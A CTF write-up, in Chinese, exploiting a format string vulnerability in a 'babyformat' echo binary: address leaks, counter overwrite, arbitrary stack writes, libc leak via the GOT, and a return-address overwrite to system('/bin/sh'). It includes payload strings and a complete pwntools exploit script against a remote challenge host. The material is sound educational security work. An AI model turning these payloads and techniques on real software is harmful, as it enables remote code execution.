***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 前言

**这两天做了一个CTF的题目，该题目的二进制[链接](https://github.com/bin2415/bin2415.github.io/blob/master/2018/07/29/format-string/babyecho)。该题目的逻辑非常简单，就是接受输入，并将其打印，在打印的时候利用了printf函数，很明显是个format
string漏洞。但由于格式化的字符串并没有在栈中，所以利用起来有一点困难，在此记录一下自己利用的方法。**

## 格式化字符串漏洞

> 格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数，[参考](https://ctf-> wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_intro/)内容点我。

一般发生格式化字符串漏洞的原因是因为并没有指定第一个参数格式化字符串(或者格式化字符串可以更改)，所以给了攻击者一个可以控制格式化字符串的机会，进而可以实现任意的内存读写能力。其中能触发格式化字符串漏洞的函数有如下几个:
scanf, printf, vprintf, vfprintf, sprintf, vsprintf, vsnprintf, setproctitle,
syslog等，如果想比较系统的了解格式化字符串漏洞，可以访问[链接](https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_intro/)。

## 程序分析

首先拿到程序，先分析一下该程序的保护措施：

![security](https://image.3001.net/2018/08/e91e6348157868de9dd8b25c81aebfb9.png)

发现其除了canary保护之外，其它防护都开了(主要是输入的buff并不在栈上，所以并没有canary保护，并不代表着可以通过buffer
overflow来溢出返回地址-_-)。

然后扔给IDA pro分析其逻辑：

![code](https://image.3001.net/2018/08/c13367945d5d4c91047b3b50234aa7ab.png)

该程序的逻辑非常简单，首先是给你三次机会，让你进行格式化字符串攻击，COUNT是全局变量，COUNT=3。接下来是exploit_me函数，该函数的逻辑更加简单，现将BUFF变量清空，然后读入13个字节，再将输入的字符串输出，在输出的时候会发生格式化字符串的攻击。其中BUFF是一个全局变量，大小是16个字节。该程序攻击起来主要有如下几个难点：

1.由于输入的长度有限(只有13个字节)，并且只允许进行三次尝试。

2.格式化字符串不在栈上，进行任意内存的读写存在一定的难度。

## 漏洞利用

接下来主要针对以上提出来的两个难点进行攻击。

### 修改计数变量

由于只允许三次输入，并且输入的长度有限，很难进行有效的攻击，所以接下来思路就是首先利用这三次输入将控制输入的计数变量修改掉，使其能够进行多次输入。

有上面程序分析可以看到，计数变量有两个：MACRO_COUNT局部变量和COUNT全局变量，只要将其中一个值修改掉，就可以进行多次输入，方便进行接下来的攻击。所以现在思路主要如下：

1.泄露地址：包括栈的地址和程序的地址。

2.修改栈的内容：保证栈中有MACRO_COUNT或者COUNT的地址。

3.修改MACRO_COUNT或者COUNT的值。

以上的每一个目的都可以利用一次format string攻击实现。

 **泄露地址**

![stack](https://image.3001.net/2018/08/fac2a47adace059aff113283a03f6760.png)

上面该图是在printf调用前的栈的内容，可以看出第一个参数是格式化字符串的地址，而接下来的一个内存单元0xffffcf6c存储的也是格式化字符串的地址，所以可以通过泄露该内存单元的内容来泄露BUFF变量的地址，从而可以算出程序的基址。接下来，ebp的内存单元存储的是saved
ebp，上一个函数的ebp值，该值是栈的地址，所以可以通过泄露该地址来泄露栈的地址。所以可以输入：

    
    
    %p%6$p
    

来泄露栈的地址和程序的地址。

 **修改栈的内容**

由于格式化字符串不在栈上，所以想通过格式化字符串来修改某个内存单元的值，首先得先把该内存的地址写入栈中。通过上面分析我们知道了栈上的地址和程序的地址，通过偏移也能计算出MACRO_COUNT和COUNT的地址。接下来则需要将MACRO_COUNT或者COUNT的地址写入栈中。在此，我选择将MACRO_COUNT的地址写入到栈中，理由如下:

![macro
count](https://image.3001.net/2018/08/89098ee641823265e196ab64f016cd79.png)

从上图可以看到0xffffcf84地址处存储的是内存单元0xffffd044的地址，而0xffffd044存储的值是0xffffd224，也是栈上的一个地址，而MACRO_COUNT也是栈上的变量，其地址与0xffffd224的高16位应该是相等的，所以此时只需要修改0xffffd044地址存储的低16位即可。这样能保证攻击顺利进行（如果修改整个32位的话，则输出的数太多，需要花费很长时间，还有一个原因是导致输入的字符串过长，没办法实现攻击）。

所以具体的攻击手段就是将0xffffd044内存单元存储的值的低16位改为MACRO_COUNT的高位byte地址即可。

假设MACRO_COUNT的地址为addr。则可以输入：

    
    
    "%" + str(addr & 0xffff) + "d" + "%9$hn"
    

即可。

 **修改MACRO_COUNT的值**

通过前面的步骤，实现了将0xffffd224的地址处存储了MACRO_COUNT的地址，而0xffffd044相对于0xffffcf60(printf的第一个参数)的offset为0xE4,则可以进行如下输入使的MACRO_COUNT的高位为0xFF。

    
    
    "%255d%57$hhn"
    

其中57为0xE4/4，因为地址是4字节的。

### 读写任意内存

通过以上的努力，我们可以进行多次的输入。由于输入的格式化字符串是全局变量，并不在栈上，我们就不能通过一次简单的输入就能读写任意内存，此时需要通过格式化字符串来间接的修改内存地址到栈上。具体思路如下：

如果我想要将地址addr写入到栈上的某个内存单元上去，设栈上的该内存单元地址为stack_addr。则我需要一次中介来完成此类攻击。

我们再来看一下调用printf时栈中的布局：

![write_everywhere](https://image.3001.net/2018/08/1ecc9f2082f6b10da824dfd2bf98aaf5.png)

可以看到0xffffcf84和0xffffcf88两个内存单元存储的内容是栈上的地址，而其又指向了一个栈上的地址。所以可以通过格式化字符串将0xffffd044地址处的内容改为stack_addr+2，将0xffffd04c地址处的内容改为stack_addr，然后再通过$hn分别向stack_addr+2处写入addr的高16位((addr&0xffff0000)>>16)，stack_addr处写入addr的低16位(addr&0xffff)。

具体的攻击过程如下：

    
    
    def modify(address, modifiedAddress):
        print("modified address is %x" % modifiedAddress)
        #puts_got_run = puts_got + binary_base
        modifiedAddress_high = (modifiedAddress & 0xffff0000) >> 16
        #log.info("strcmp got run high %x " % strncmp_got_run_high)
        modifiedAddress_low = modifiedAddress & 0xffff
    
        temp_low = (address + 0x2) & 0xffff
        print("temp low is %x" % temp_low)
        payload3 = "%"+str(temp_low) + "d" + "%9$hn"
        p.sendline(payload3)
        p.recvrepeat(0.5)
    
        temp_high = (address) & 0xffff
        print("temp high is %x" % temp_high)
        payload4 = "%" + str(temp_high) + "d" + "%10$hn"
        p.sendline(payload4)
        p.recvrepeat(0.5)
    
        payload5 = "%" + str(modifiedAddress_high)+"d" + "%57$hn"
        print("got run high is %x " % (modifiedAddress_high))
        p.sendline(payload5)
        # p.recv()
        # sleep(1)
        p.recvrepeat(0.5)
    
        payload6 = "%" + str(modifiedAddress_low)+"d"+"%59$hn"
        print("got run low is %x " % (modifiedAddress_low))
        p.sendline(payload6)
        p.recvrepeat(0.5)
    

其中address就是此处的stack_addr，modifiedAddress就是此处的addr。

有了可以向栈中写入任意地址的能力，我们就可以进行libc地址的泄露和修改返回地址及其参数了。

 **泄露libc地址**

通过以上的方法，我们可以将printf函数的got地址写入到栈上，然后通过%s读取got的内容，从而泄露libc的地址。由于改题目并没有提供具体的libc版本，所以可以通过泄露的printf的地址，到[libc
database
search](https://libc.blukat.me/)网站进行查询。通过绣楼libc地址，我们可以得到system的地址和"/bin/sh"字符串的地址。

 **修改返回地址和参数**

由于泄露了libc的地址，所以将main函数的返回地址修改为system的地址，并将其参数设为"/bin/sh"字符串的地址，输入EXIT，即可完成攻击。

整个的攻击脚本如下：

    
    
    from pwn import *
    
    def modify(address, modifiedAddress):
        print("modified address is %x" % modifiedAddress)
        #puts_got_run = puts_got + binary_base
        modifiedAddress_high = (modifiedAddress & 0xffff0000) >> 16
        #log.info("strcmp got run high %x " % strncmp_got_run_high)
        modifiedAddress_low = modifiedAddress & 0xffff
    
        temp_low = (address + 0x2) & 0xffff
        print("temp low is %x" % temp_low)
        payload3 = "%"+str(temp_low) + "d" + "%9$hn"
        p.sendline(payload3)
        p.recvrepeat(0.5)
    
        temp_high = (address) & 0xffff
        print("temp high is %x" % temp_high)
        payload4 = "%" + str(temp_high) + "d" + "%10$hn"
        p.sendline(payload4)
        p.recvrepeat(0.5)
    
        payload5 = "%" + str(modifiedAddress_high)+"d" + "%57$hn"
        print("got run high is %x " % (modifiedAddress_high))
        p.sendline(payload5)
        # p.recv()
        # sleep(1)
        p.recvrepeat(0.5)
    
        payload6 = "%" + str(modifiedAddress_low)+"d"+"%59$hn"
        print("got run low is %x " % (modifiedAddress_low))
        p.sendline(payload6)
        p.recvrepeat(0.5)
    
    #p = process('./babyformat')
    pp = ELF('./babyformat')
    p = remote('104.196.99.62', port = 2222)
    p.recvuntil('==== Baby Format - Echo system ====')
    
    puts_got = pp.got['puts']
    # puts_offset = 0x5fca0
    # bin_sh_offset = 0x15ba0b
    # system_offset = 0x3ada0
    system_offset = 0x3cd10
    puts_offset = 0x67360
    bin_sh_offset = 0x17b8cf
    
    ## leak address
    p.sendline('%p%6$p')
    #sleep(3)
    p.recvline()
    leaked = p.recvline()
    addr_buff = int(leaked[2:10], 16)
    binary_base = addr_buff - 0x202c 
    log.info("BUFF address is %x" % addr_buff)
    addr_stack_ebp = int(leaked[12:20], 16) - 0x20
    log.info("ebp address is %x" % addr_stack_ebp)
    
    #ebp_low_four = addr_stack_ebp & 0xffff
    
    # variable MACRO_COUNT address's low four bytes
    count_low_four = (addr_stack_ebp + 0x17) & 0xffff
    
    payload1 = "%" + str(count_low_four) + "d" + "%9$hn"
    p.sendline(payload1)
    p.recvrepeat(1)
    
    payload2 = "%255d%57$hhn"
    p.sendline(payload2)
    p.recvrepeat(1)
    
    ####### No problem up ##############################
    
    puts_got_run = puts_got + binary_base
    modify(addr_stack_ebp + 0x20, puts_got_run)
    
    p.recvrepeat(1)
    #leak the strncmp address
    payload7 = "%14$s"
    p.sendline(payload7)
    # print(p.recv())
    #sleep(1)
    puts_address = u32(p.recvline()[0:4])
    log.info("puts address is %x " % puts_address)
    libc_base = puts_address - puts_offset
    log.info("libc base address is %x" % libc_base)
    
    #############leak libc address done ############
    
    ret_address = addr_stack_ebp + 0x34
    arg_address = addr_stack_ebp + 0x3c
    
    system_address = system_offset + libc_base
    bin_sh_address = bin_sh_offset + libc_base
    
    modify(ret_address, system_address)
    modify(arg_address, bin_sh_address)
    #raw_input()
    p.recvrepeat(1)
    #p.sendline('EXIT')
    
    p.interactive()
    

## References

1.ctf-wiki：格式化字符串漏洞原理介绍：<https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_intro/>

2.lib database search：<https://libc.blukat.me/>

 ***本文作者：bin2415，转载请注明来自FreeBuf.COM**

